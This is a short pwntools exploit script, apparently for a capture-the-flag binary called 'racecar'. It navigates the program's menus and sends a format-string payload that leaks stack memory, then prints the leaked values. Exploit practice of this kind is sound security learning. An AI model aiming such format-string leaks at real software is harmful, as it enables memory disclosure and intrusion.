from pwn import *
import exploit_helper

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
exe = './racecar'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# success = False
#
# while not success:
io = exploit_helper.start(exe=exe, gdb_script=gdb_script)

io.sendlineafter(b'Name: ', b'Ricky Bobby')
io.sendlineafter(b'Nickname: ', b'Ricky Bobby')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'> ', b'1')

# io.interactive()

io.sendlineafter(b'> ', b'|%Lf %Lf %Lf %Lf %c%c%c%c%c%c%c%c%c%c%c|')
io.recvuntil(b'|')

result = io.recvuntil(b'|')[:-1]

split_results = result.split(b' ')

print(split_results)
